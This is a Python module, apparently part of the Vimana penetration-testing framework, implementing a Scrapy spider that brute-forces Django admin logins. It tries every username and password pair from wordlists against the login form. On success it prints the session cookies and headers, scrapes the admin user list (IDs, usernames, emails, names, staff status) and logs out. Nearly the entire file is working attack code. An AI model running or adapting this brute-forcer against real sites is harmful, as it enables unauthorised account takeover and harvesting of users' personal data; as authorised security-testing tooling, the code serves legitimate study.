# -*- coding: utf-8 -*-
#  __ _
#   \/imana 2016
#   [|-ramewørk
#
#
# Author: s4dhu
# Email: <s4dhul4bs[at]prontonmail[dot]ch
# Git: @s4dhulabs
# Mastodon: @s4dhu
# 
# This file is part of Vimana Framework Project.

from res.vmnf_validators import check_file
from scrapy.exceptions import CloseSpider
from neotermcolor import colored,cprint
from scrapy.http import HtmlResponse
from urllib.parse import urljoin
from datetime import datetime 
from .. res import config
from time import sleep 
import requests
import scrapy
import sys,os

from res.colors import *
from tabulate import tabulate
from requests.exceptions import *
from ._items import CrawlerPool



class jungle_engine(scrapy.Spider):
    name = 'jungle_engine'

    def __init__(self, *args,**handler):
        super(jungle_engine, self).__init__(*args,**handler)
        self.handler = handler

        self.start_urls = [
                urljoin(handler.get('target_url'), 
                    config.admin_redir_path)
        ]
        
        # Default settings
        self.usernames = config.usernames
        self.passwords = config.passwords
        self.userlen = config.userlen
        self.passlen = config.passlen

        if handler['usernames_file']:
            usernames_file = handler.get('usernames_file')

            if not check_file(usernames_file,True):
                print(f"\n[jungle:{datetime.now()}] → Invalid usernames file.")
                os._exit(os.EX_OK)

            self.usernames = open(usernames_file, 'r').readlines()
            self.userlen = len(self.usernames)

        if handler['passwords_file']:
            passwords_file = handler.get('passwords_file')

            if not check_file(passwords_file,True):
                print(f"\n[jungle:{datetime.now()}] → Invalid passwords file.")
                os._exit(os.EX_OK)

            self.passwords = open(passwords_file, 'r').readlines()
            self.passlen = len(self.passwords)
            
        self.pool = {
            'credentials': [],
            'request_auth_data': {}
        } 

        if not self.start_urls:
            self.log(f'[jungle:{datetime.now()}] Missing scope: endpoint')
            print(f'[jungle:{datetime.now()}] Missing scope: endpoint')

            return
        
        self.verbose_enabled = handler.get('verbose', False)
        self.sample_mode = handler.get('sample',False)
        self.users_table = []
       
        print('\n[{}] {}\n'.format(
            colored(datetime.now(),'cyan'),
            colored('→ Starting bruteforce...','white', attrs=['bold'])
            )
        )
                
        print('{:>30}: {}'.format(
            colored('endpoint','blue'),
            colored(self.start_urls[0],'green')
            )
        )
        print('{:>30}: {} / {}'.format(
            colored('users','blue'),
            colored(str(self.userlen),'green'),
            colored(config.raw_path.format(
                config.user_file
                ),'green')
            )
        )
        print('{:>30}: {} / {}'.format(
            colored('passwords:','blue'),
            colored(str(self.passlen),'green'),
            colored(config.raw_path.format(
                config.pass_file
                ),'green')
            )
        )
        sleep(1)

    def parse(self,response):
        csrfmiddlewaretoken = response.css('input[name="csrfmiddlewaretoken"]::attr(value)').extract_first()
        self.log('[jungler:{}] Accessing endpoint: {}'.format(datetime.now(),response.url))
        
        print()
        for username in self.usernames:
            for password in self.passwords:

                username = username.strip()
                password = password.strip()

                if self.verbose_enabled and not self.sample_mode:
                    print(f'{username:>30}:{password}')
                    sleep(0.03)

                auth_data={
                    'username': username,
                    'password': password,
                }
                
                yield scrapy.FormRequest.from_response(
                    response,
                    formdata=auth_data,
                    callback=self.parse_auth_step,
                    meta={'formdata':auth_data}
                )
    
    def closed(self,reason):
        if not self.pool['credentials']:
            msg = colored("No valid credentials were found with current settings.", 'red')
            print(f"\n\t  * {msg}")

        if self.handler['callback_session']:
            vmnf_callback_session = self.handler.get('prompt')

            # disable callback session flag
            # self.handler['callback_session'] = False

            if not self.handler.get('siddhi_callbacks'):
                self.handler['siddhi_callbacks'] = []

            self.handler['siddhi_callbacks'].append(
                {
                    'cid': (len(self.handler['siddhi_callbacks']) + 1),
                    'when': datetime.now(),
                    'siddhi_run': self.handler.get('siddhi_run'),
                    'type': 'bruteforce',
                    'findings': {
                        'siddhi_session': self.pool,
                        'users_table': self.users_table
                    },
                    'config': {
                        'file': 'siddhis/jungler/res/config.py',
                        'round_hash': config.round_hash,
                        'user_file_hash': config.user_file_hash,
                        'pass_file_hash': config.pass_file_hash,
                        'num_pass': self.passlen,
                        'num_users': self.userlen
                    }
                    
                }
            )
            
            # return to caller session
            vmnf_callback_session(**self.handler)
        
        os._exit(os.EX_OK)

    def parse_cookies(self,response):
        try:
            csrftoken, sessionid = response.request.headers.get('Cookie').decode().split(';')
        except AttributeError: 
            return 
        
        return {
            'csrftoken': csrftoken.split('=')[1].strip(),
            'sessionid': sessionid.split('=')[1].strip(),
        }
        
    def do_logout(self, response):
        client = requests.session()

        try:
            logout_resp = client.get(
                response.urljoin(config.logout_path), 
                headers=self.pool['request_auth_data'].get('headers'),
                cookies=self.pool['request_auth_data'].get('cookies'), 
                verify=False
            )
        except requests.exceptions.ConnectionError:
            print('\n[{}] → {}\n'.format(
                colored(datetime.now(), 'cyan'),
                colored('The application does not appear to be running.','red', attrs=['bold'])
                )
            )
            raise CloseSpider('Connection Error: application is not running')

        if 'Logged out' in logout_resp.text:
            print('\n[{}] → {}\n'.format(
                colored(datetime.now(),'cyan'),
                colored(config.logout_kw,'white', attrs=['bold'])
                )
            )
            self.log('[jungler:{}] Logout performed: {}'.format(
                datetime.now(),response.urljoin(config.logout_path)))

            for k,v in (logout_resp.headers.items()):
                print('{:>30}: {}'.format(
                    colored(k.strip(),'blue'),
                    colored(v.strip(),'green')
                    )
                )
            print()

            return 
            
    def list_users(self,response):
        session = requests.session()
        session_id = response.request.headers.get('Cookie').decode().split(';')[1].split('=')[1][1:20]

        msg = colored("Harvesting users through session", 'white', attrs=['bold'])
        hl_session_id = colored(session_id + '...', 'blue')
        print(f"\t  → {msg} {hl_session_id}")
        sleep(1)
        
        try:
            response = HtmlResponse(
                response.urljoin(config.users_path),
                body = session.get(
                    response.urljoin(config.users_path),
                    headers=config.headers.update({'Referer':response.url}),
                    cookies=self.parse_cookies(response),
                    verify=False).content,
                encoding='utf8'
            )
        except requests.exceptions.ConnectionError:
            print('\n[{}] → {}\n'.format(
                colored(datetime.now(),'cyan'),
                colored('The application does not appear to be running.','red', attrs=['bold'])
                )
            )
            raise CloseSpider('Connection Error: application is not running')

        list_users_ok = True if 'field-username' in response.text \
            and 'field-email' in response.text \
            and self.auth_meta.get('username') in response.text \
            else False

        if not list_users_ok:
            _user_ = self.auth_meta.get('username')
            msg = colored(f"User {_user_} does not have permission to log into Django's administrative endpoint.", 'yellow', attrs=['bold'])
            hl_session_id = colored(session_id, 'blue')
            print(f"\t  → {msg}")

            return 
        
        self.users_table.append(
            [
                colored('UID', 'cyan'), 
                colored('Type', 'cyan'), 
                colored('Username','cyan'),
                colored('Email','cyan'), 
                colored('Password','cyan'),
                colored('First Name','cyan'), 
                colored('Last Name','cyan')
            ]
        )

        three_rows = response.xpath('//tbody')
        for row in three_rows:
            for user in row.xpath('.//tr'):
                staff_status = (user.css('td[class=field-is_staff] img::attr(alt)').extract_first())
                user_id = (user.css('td[class=action-checkbox] input::attr(value)').extract_first())
                username = (user.css('th[class=field-username] a::text').extract_first())
                user_email = (user.css('td[class=field-email]::text').extract_first())
                first_name = (user.css('td[class=field-first_name]::text').extract_first())
                last_name =  (user.css('td[class=field-last_name]::text').extract_first())
                user_password = '***********'

                staff_status = 'admin' if staff_status == 'True' else 'user'

                if self.auth_meta['username'] == username.strip():
                    user_id = colored(user_id, 'green')
                    staff_status = colored(staff_status, 'green')
                    username = colored(username, 'green')
                    user_email = colored(user_email, 'green')
                    user_password = colored(self.auth_meta.get('password'), 'green')
                    first_name = colored(first_name, 'green')
                    last_name = colored(last_name, 'green')

                self.users_table.append(
                        [
                            user_id, 
                            staff_status, 
                            username, 
                            user_email, 
                            user_password, 
                            first_name,last_name
                        ]
                )

        print(tabulate(
            self.users_table,
            headers='firstrow',
            tablefmt='fancy_grid',missingval='?'
            )
        )
        
    def build_auth_headers(self,response):
        headers = config.headers
        headers.update({'Referer':response.url})

        if not response:
            print(self.fail_msg + ' / build_auth_headers()')
            raise CloseSpider('Connection Error: application is not running')

        self.pool['request_auth_data']={
            'headers': headers,
            'cookies': self.parse_cookies(response)
        }
        
        return True

    def parse_auth_step(self, response):
        self.auth_meta = response.meta['formdata']
        auth_pattern = False
        logout_link_found = response.css('a[href="/admin/logout/"]').extract_first()
        
        self.fail_msg = '[jungler:{}] → [{}] Authentication failure: {}:{}'.format(
            colored(datetime.now(),'cyan'), response.status,
            self.auth_meta.get('username'),
            self.auth_meta.get('password')
        )

        if response.status != 200:
            self.log(self.fail_msg)
            return

        if not logout_link_found:
            self.log(self.fail_msg)
            return

        try:
            auth_pattern = (response.xpath(config.auth_kw).getall())
            auth_pattern = auth_pattern[0].split(',')[0].strip()
        except:
            self.log(self.fail_msg)
            return

        if logout_link_found \
            and auth_pattern == config.login_ok:

            self.pool['credentials'].append(self.auth_meta)

            print('\n\n[{}] → {}: {}:{}\n'.format(
                colored(datetime.now(),'cyan'),
                colored(config.login_done_msg, 'white',attrs=['bold']),
                colored(self.auth_meta.get('username'), 'green'),
                colored(self.auth_meta.get('password'), 'green')
                )
            )

            for k,v in (response.request.headers.items()):
                print('{:>30}: {}'.format(
                    colored(k.decode(),'blue'),
                    colored(v[0].decode(),'green')
                    )
                )
            print()
            
            if self.build_auth_headers(response):
                self.list_users(response)
                self.do_logout(response)

